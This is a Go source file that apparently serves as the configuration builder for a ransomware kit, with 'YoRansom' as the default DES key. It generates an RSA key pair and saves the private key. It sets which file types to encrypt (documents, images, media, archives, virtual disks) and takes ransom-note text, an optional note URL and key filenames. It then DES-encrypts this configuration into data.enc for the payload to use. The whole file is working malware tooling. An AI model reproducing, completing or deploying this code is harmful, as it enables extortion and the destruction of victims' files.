package main

import (
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"os"
	"strconv"
	"strings"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"reflect"
	"crypto/des"
	"encoding/base64"
	"io/ioutil"
	"flag"
)

func main() {
	// Set Args
	skipHidden := flag.Bool("SkipHidden", true, "Skip hidden file? (For windows only) (Y/N)")
	desKey := flag.String("desKey", "YoRansom", "DES Key to encrypt config data")

	// Set configs
	N, E := GenRsaKey(1024)
	conf := Config{EncSuffix: ".vmdk|.txt|.zip|.rar|.7z|.doc|.docx|.ppt|.pptx|.xls|.xlsx|.jpg|.gif|.jpeg|.png|.mpg|.mov|.mp4|.avi|.mp3|.pdf|.psd", PubKeyN: N, PubKeyE: E}
	questionDict := map[string]string{
		"KeyFilename":  "Filename to store key file",
		"DkeyFilename": "Filename to store key file for decrypt",
		"ReadmeUrl":    "URL of ONLINE readme file(keep blank to disable)", "ReadmeNetFilename": "Filename of ONLINE readme file(if enabled)",
		"Readme":       "Content of OFFLINE readme file(ONE line)", "ReadmeFilename": "Filename of OFFLINE readme file",
		"Filesuffix":    "Suffix to be added to the end of encrypted files(Include dot)", }
	argDict := map[string]*string{}
	for key, q := range questionDict {
		argDict[key] = flag.String(key, "", q)
	}
	flag.Parse()
	if len(os.Args) != 9{
		flag.Usage()
		return
	}
	for key, q := range argDict {
		reflect.ValueOf(&conf).Elem().FieldByName(key).SetString(*q)
	}

	conf.SkipHidden = *skipHidden

	conf.check()

	// Encrypt JSON data
	data := conf.export()
	cip, _ := des.NewCipher([]byte(*desKey))
	for offset := 0; len(data)-offset > 8; offset += 8 {
		cip.Encrypt(data[offset:offset+8], data[offset:offset+8])
	}

	// Write Encrypted data to file
	bE := base64.StdEncoding
	target := bE.EncodeToString(data)
	ioutil.WriteFile("data.enc", []byte(target), 0)
}

// Key Pair Gen Funcs
func GenRsaKey(bits int) (N string, E int) {
	privateKey, err := rsa.GenerateKey(rand.Reader, bits)
	check(err)
	derStream := x509.MarshalPKCS1PrivateKey(privateKey)
	block := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: derStream,
	}
	file, err := os.Create("private.pem")
	check(err)
	err = pem.Encode(file, block)
	check(err)
	publicKey := &privateKey.PublicKey
	pubBytes := make([]string, len(publicKey.N.Bytes()))
	for c, i := range publicKey.N.Bytes() {
		pubBytes[c] = strconv.Itoa(int(i))
	}
	pubString := strings.Join(pubBytes, "/")
	return pubString, publicKey.E
}

func check(err error) {
	if err != nil {
		panic(err)
	}
}

// Config struct Funcs
type Config struct {
	PubKeyN string
	PubKeyE int

	Filesuffix   string
	KeyFilename  string
	DkeyFilename string

	Readme         string
	ReadmeFilename string

	ReadmeUrl         string
	ReadmeNetFilename string

	EncSuffix  string
	SkipHidden bool
}

func (self *Config) init(data []byte) {
	err := json.Unmarshal(data, self)
	if err != nil {
		fmt.Println("[Error] Cannot load JSON data.")
		os.Exit(213)
	}
}

func (self *Config) nE(test string) bool {
	if strings.TrimSpace(reflect.ValueOf(self).Elem().FieldByName(test).String()) != "" {
		return true
	}
	return false
}

func (self *Config) check() {
	notEmptyList := []string{"PubKeyN", "PubKeyE", "Filesuffix", "KeyFilename", "DkeyFilename", "Readme", "ReadmeFilename", "EncSuffix", "SkipHidden"}
	for _, k := range notEmptyList {
		if !self.nE(k) {
			fmt.Println("[Error] Config field", k, "can not be empty.")
			os.Exit(213)
		}
	}
}

func (self *Config) export() []byte {
	data, err := json.Marshal(self)
	check(err)
	return data
}
